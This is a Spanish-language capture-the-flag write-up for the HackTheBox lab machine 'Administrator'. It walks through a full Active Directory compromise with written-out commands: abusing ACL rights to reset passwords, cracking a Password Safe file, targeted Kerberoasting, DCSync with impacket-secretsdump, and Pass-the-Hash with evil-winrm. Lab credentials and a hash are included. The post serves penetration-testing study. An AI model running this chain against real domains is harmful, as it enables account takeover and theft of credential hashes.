+++ 
draft = false
date = 2026-03-07T05:44:18Z
title = "Administrator Machine - HackTheBox"
description = "Esta es una máquina de nivel medium de la plataforma HackTheBox, en la cual se toca varios temas de Active Directory"
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++
-------------------------
- Tags: #Machine #Windows #Medium 
----------------

# Introducción

**Administrator** es una máquina Windows de dificultad media basada en el compromiso completo de un dominio de Active Directory. Al iniciar la máquina se proporcionan credenciales de un usuario con bajos privilegios, las cuales se utilizan para enumerar el dominio mediante `BloodHound` y descubrir relaciones de permisos entre usuarios.

Durante la enumeración se observa que el usuario `Olivia` posee permisos `GenericAll` sobre `Michael`, lo que permite restablecer su contraseña y obtener acceso a su cuenta. Una vez autenticados como `Michael`, se descubre que puede forzar el cambio de contraseña del usuario `Benjamin`, lo que permite comprometer también esa cuenta.

Con acceso a `Benjamin`, se encuentra un servicio FTP que contiene un archivo `.psafe3`, perteneciente a `Password Safe`. La contraseña de esta base de datos se crackea utilizando `John the Ripper`, revelando varias credenciales de usuarios del dominio. Tras realizar un password spraying con estas credenciales, se obtiene acceso a la cuenta `Emily`.

Posteriormente, se identifica que `Emily` posee permiso `GenericWrite` sobre el usuario `Ethan`, lo que permite realizar un `targeted Kerberoasting` para obtener un hash Kerberos de dicha cuenta. Este hash es crackeado, obteniendo así acceso como `Ethan`.

Finalmente, se descubre que `Ethan` posee permisos de replicación del dominio (`GetChanges`, `GetChangesAll` y `GetChangesInFilteredSet`), lo que permite ejecutar un ataque `DCSync` y obtener el hash NTLM de la cuenta `Administrator`. Utilizando este hash se realiza un `Pass-the-Hash` mediante `Evil-WinRM`, logrando acceso administrativo completo al dominio.

# Información previa

Como es común en pentests reales de Windows, comenzarás la máquina **Administrator** con credenciales para la siguiente cuenta: 

Usuario: ``Olivia``  
Contraseña: ``ichliebedich``.
# Enumeración Nmap

Realizamos un escaneo de los puertos, encontrando varios puertos abiertos que nos indican que la máquina escaneada corre el sistema operativo `Windows`

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.1.102 -oG allPorts
```

<img src="/images/Pasted image 20260306133722.png" style="width:100%; height:auto; display:block; margin:auto;">

Escaneando los servicios y las versiones que corren en los puertos encontrados anteriormente, tenemos lo siguiente

En el resultado del escaneo, podemos ver que se encuentra el servicio `FTP` abierto, además podemos ver el nombre de dominio `administrator.htb`

<img src="/images/Pasted image 20260306134056.png" style="width:100%; height:auto; display:block; margin:auto;">

Procederemos a agregarlo a nuestro `/etc/hosts`

<img src="/images/Pasted image 20260306134729.png" style="width:100%; height:auto; display:block; margin:auto;">

# Enumeración SMB

Primeramente probamos las credenciales proporcionadas inicialmente, para confirmar que estas sean válidas

```bash
netexec smb administrator.htb -u 'Olivia' -p 'ichliebedich'
```

y tenemos como resultado que el dominio acepta las credenciales

<img src="/images/Pasted image 20260306135315.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora revisamos si nuestro usuario tiene acceso a algún recurso compartido por `SMB`.

```bash
netexec smb administrator.htb -u 'Olivia' -p 'ichliebedich' --shares
```

Encontrando que tenemos acceso de lectura en `IPC$`, `NETLOGON` y `SYSVOL`

<img src="/images/Pasted image 20260306135429.png" style="width:100%; height:auto; display:block; margin:auto;">

Dentro de estos directorios no encontramos nada interesante

# Enumeración LDAP

Como tenemos credenciales válidas, haremos una enumeración de usuarios con `ldapsearch`, de la siguiente forma

```bash
ldapsearch -x -H ldap://10.129.1.102 -D 'administrator\Olivia' -w 'ichliebedich' -b "DC=administrator,DC=htb" | grep "userPrincipalName"
```

Encontrando que en el dominio existen los siguientes usuarios

<img src="/images/Pasted image 20260306140126.png" style="width:100%; height:auto; display:block; margin:auto;">

Para quedarnos solo con los usuarios y guardarlo en un archivo de texto tenemos el siguiente comando

```bash
ldapsearch -x -H ldap://10.129.1.102 -D 'administrator\Olivia' -w 'ichliebedich' -b "DC=administrator,DC=htb" | grep "userPrincipalName" | awk '{print $2}' | cut -d '@' -f1 >> users
```

# Enumeración de Active Directory

Para realizar una enumeración del dominio más exhaustiva, y encontrar vías potenciales para migrar de usuario con el fin de escalar privilegios, utilizaremos la herramienta `bloodhound`

## Recolectar datos .zip

Como tenemos credenciales de un usuario válido en el dominio, utilizaremos `bloodhound-python`, para recolectar información en un zip, de la siguiente manera

```bash
bloodhound-python -u 'Olivia' -p 'ichliebedich' -d administrator.htb -ns 10.129.1.193 -c All --zip
```

<img src="/images/Pasted image 20260306231735.png" style="width:100%; height:auto; display:block; margin:auto;">

Al utilizar por primera vez el comando, nos mostrará que intenta hacer resolución de dominio a `dc.administrator.htb`,  por tanto deberemos agregar ese subdominio a nuestro `/etc/host`

<img src="/images/Pasted image 20260306231746.png" style="width:100%; height:auto; display:block; margin:auto;">

y posteriormente al volver a utilizar el comando anterior, nos mostrará un error por el desfase horario entre nuestra máquina atacante y el AD

<img src="/images/Pasted image 20260306231839.png" style="width:100%; height:auto; display:block; margin:auto;">

Para solucionar esto utilizaremos `faketime` y  `ntpdate` de la siguiente forma

```bash
faketime "$(ntpdate -q 10.129.1.193 | cut -d ' ' -f 1,2)" bloodhound-python -u 'Olivia' -p 'ichliebedich' -d administrator.htb -ns 10.129.1.193 -c All --zip
```

Así obtenemos nuestro archivo `.zip` que deberemos cargar en `Bloodhound`

<img src="/images/Pasted image 20260306232034.png" style="width:100%; height:auto; display:block; margin:auto;">

## Preparar docker con Bloodhound

Para crear nuestro contenedor con `Bloodhound` descargaremos el `docker-compose` desde la siguiente página web https://0ut3r.space/2024/04/22/bloodhound-ce-and-docker/

Basta con realizar el siguiente comando para descargarlo

```bash
wget https://raw.githubusercontent.com/SpecterOps/bloodhound/main/examples/docker-compose/docker-compose.yml
```

Una vez descargada deberemos iniciar el contenedor con el siguiente comando

```bash
docker-compose up -d
```

Posteriormente accedemos desde nuestro navegador a `localhost:8080` y se nos abrirá la interaz de `Bloodhound`

<img src="/images/Pasted image 20260306232542.png" style="width:100%; height:auto; display:block; margin:auto;">

En el apartado de correo pondremos `admin`, y para obtener la contraseña habrá que leer los logs de nuestro contenedor con el siguiente comando

```bash
docker-compose logs
```

<img src="/images/Pasted image 20260306232632.png" style="width:100%; height:auto; display:block; margin:auto;">

En este apartado deberemos subir el `.zip` que obtuvimos anteriormente

<img src="/images/Pasted image 20260306232728.png" style="width:100%; height:auto; display:block; margin:auto;">

y luego vamos a `Administration`, y esperamos hasta que aparezca `Complete`

<img src="/images/Pasted image 20260306232824.png" style="width:100%; height:auto; display:block; margin:auto;">

# Movimiento lateral via Bloodhound

Como bien sabemos, tenemos las credenciales del usuario `Olivia` por tanto veremos las propiedades y los permisos que tiene este usuario

Vemos que `Olivia` tiene permisos `GenericAll` sobre `Michael`, lo que permite control total sobre este usuario

<img src="/images/Pasted image 20260307013418.png" style="width:100%; height:auto; display:block; margin:auto;">

Lo que haremos será restablecer la contraseña de `Michael` a `newP@ssword2022` de la siguiente forma

```bash
net rpc password "Michael" "newP@ssword2022" -U "administrator.htb"/"Olivia"%"ichliebedich" -S "administrator.htb"
```

Vemos que no nos aparece ningún mensaje

<img src="/images/Pasted image 20260307013601.png" style="width:100%; height:auto; display:block; margin:auto;">

Para comprobar si el cambio de contraseña se realizó correctamente, podemos aprovecharnos del protocolo SMB con `netexec`, de la siguiente forma

```bash
netexec smb administrator.htb -u 'Michael' -p 'newP@ssword2022'
```

y vemos que la contraseña de `Michael` se cambió exitosamente

<img src="/images/Pasted image 20260307013711.png" style="width:100%; height:auto; display:block; margin:auto;">

Viendo los permisos de `Michael`, vemos que tiene permisos `ForceChangePassword` sobre `Benjamin`, por lo tanto podemos cambiar la contraseña de `Benjamin` al igual como lo hicimos con `Michael`

```bash
net rpc password "Benjamin" "newP@ssword2022" -U "administrator.htb"/"Michael"%"newP@ssword2022" -S "administrator.htb"
```

y vemos que se ha cambiado correctamente

<img src="/images/Pasted image 20260307014029.png" style="width:100%; height:auto; display:block; margin:auto;">

En cuanto al usuario `Benjamin`, no tiene permisos sobre ningún otro usuario, pero este es miembro del grupo `SHARE MODERATORS`

<img src="/images/Pasted image 20260307014123.png" style="width:100%; height:auto; display:block; margin:auto;">

Probaremos ver si tiene acceso a algún recurso compartido extra por `SMB`, a lo cual no vemos nada adicional a lo que podíamos ver con los demás usuarios

<img src="/images/Pasted image 20260307014234.png" style="width:100%; height:auto; display:block; margin:auto;">

Entonces iniciaremos sesión por el protocolo `FTP` para ver si hay algo interesante con sus credenciales

```bash
ftp administrator.htb
```

Y encontramos un archivo llamado `Backup.psafe3`

<img src="/images/Pasted image 20260307014405.png" style="width:100%; height:auto; display:block; margin:auto;">

# Fuerza bruta a Password safe

Buscando información sobre el archivo `.psafe3`, este es una base de datos de `Password safe`, un gestor de contraseñas offline.

Si hacemos un `file`, nos dice lo mismo

<img src="/images/Pasted image 20260307014742.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto utilizaremos la herramienta `pwsafe2john` para obtener el hash y posteriormente poder crackearlo con  `john`

```bash
pwsafe2john Backup.psafe3 > hash.txt
```

Ahora utilizamos `john`

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Encontrando la contraseña del gestor `tekieromucho`

<img src="/images/Pasted image 20260307014929.png" style="width:100%; height:auto; display:block; margin:auto;">

Abrimos el archivo con el siguiente comando

```bash
pwsafe Backup.psafe3
```

Y utilizamos la contraseña obtenida con el ataque de fuerza bruta

<img src="/images/Pasted image 20260307015014.png" style="width:100%; height:auto; display:block; margin:auto;">

Encontramos las contraseñas de tres usuarios, que sabemos que forman parte del dominio.

<img src="/images/Pasted image 20260307015039.png" style="width:100%; height:auto; display:block; margin:auto;">

Viendo por los permisos que tiene cada usuario, el más relevante es `Emily`, ya que tiene permisos `GenericWrite` sobre `Ethan`

<img src="/images/Pasted image 20260307015215.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto tomamos su contraseña `UXLCI5iETUsIBoFVTj8yQFKoHjXmb`

y tenemos lo siguiente

<img src="/images/Pasted image 20260307015248.png" style="width:100%; height:auto; display:block; margin:auto;">

# Kerberoast attack

Como tenemos las credenciales de `Emily`, podemos hacer un Targeted kerberoast attack hacia `Ethan`, como dice en `Bloodhound` 

<img src="/images/Pasted image 20260307015724.png" style="width:100%; height:auto; display:block; margin:auto;">

Para ello descargaremos el siguiente script `targetedKerberoast.py` de https://github.com/ShutdownRepo/targetedKerberoast

```bash
wget https://raw.githubusercontent.com/ShutdownRepo/targetedKerberoast/refs/heads/main/targetedKerberoast.py
```

el comando que utilizaremos es el siguiente, para evitar problemas con la sincronización horaria utilizaremos `faketime`

```bash
faketime "$(ntpdate -q 10.129.1.193 | cut -d ' ' -f 1,2)" python3 targetedKerberoast.py -v -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

y obtenemos el TGS de ethan, que podemos crackearlo de  forma offline con `john`

<img src="/images/Pasted image 20260307015910.png" style="width:100%; height:auto; display:block; margin:auto;">

creamos un archivo con el contenido obtenido, y procedemos a crackearlo con `john`

```bash
john ethan-hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Obteniendo la contraseña de `Ethan : limpbizkit` 

<img src="/images/Pasted image 20260307020047.png" style="width:100%; height:auto; display:block; margin:auto;">

# Escalada de privilegios via DCSync

Ahora como `Ethan` tenemos los siguiente permisos

<img src="/images/Pasted image 20260307020113.png" style="width:100%; height:auto; display:block; margin:auto;">

Los permisos críticos son `GetChanges`, `GetChangesAll` y `GetChangesInFilteredSet`. Tener ambos nos permite realizar un `DCSync`, lo que nos dará acceso a los hashes NTLM de los usuarios del dominio > lo que nos permitirá autenticarnos en la red mediante la técnica `Pass-the-Hash`.

Para ello utilizaremos la herramienta `Impacket`, de la siguiente forma

```bash
impacket-secretsdump 'administrator.htb'/'Ethan':'limpbizkit'@'dc.administrator.htb'
```

Con esto obtenemos el hash NTLM de todos los usuarios

<img src="/images/Pasted image 20260307021021.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora con el hash NTLM de `administrator` podemos hacer PASS-THE-HASH

```bash
evil-winrm -i 10.129.1.193 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

y nos conectamos a la máquina víctima como `administrator`

<img src="/images/Pasted image 20260307021146.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora podemos obtener la flag de `user.txt` y de `root.txt`

<img src="/images/Pasted image 20260307021356.png" style="width:100%; height:auto; display:block; margin:auto;">
